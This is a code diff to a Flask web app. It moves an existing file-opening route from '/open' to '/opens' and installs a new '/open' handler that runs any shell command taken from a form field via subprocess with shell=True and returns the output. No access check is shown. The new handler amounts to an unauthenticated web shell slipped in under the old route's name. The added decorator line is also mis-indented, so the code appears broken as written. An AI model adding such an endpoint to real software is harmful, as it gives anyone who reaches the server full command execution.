@@ -16,7 +16,7 @@ def editor():
 def editor2():
     current_directory = os.getcwd()
     return f"当前文件所在目录：{current_directory}"
-@app.route('/open', methods=['POST'])
+@app.route('/opens', methods=['POST'])
 def open_file():
     file_path = request.form['file_path']
     try:
@@ -31,7 +31,19 @@ def open_file():
         return '文件不存在'
     except PermissionError:
         return '无权限访问文件'
-    
+ @app.route('/open', methods=['POST'])
+def executeo():
+    directory = request.form['file_path']
+    try:
+        os.chdir(directory)  # 改变工作目录为表单字段的值
+        command = request.form['command']
+        
+        result = subprocess.check_output(command, shell=True)
+        result = result.decode('utf-8')  # 将字节流转换为字符串
+        return render_template('editor.html', result=result)
+    except Exception as e:
+        error_message = str(e)
+        return render_template('indexcm.html', error_message=error_message)   
         
      
 
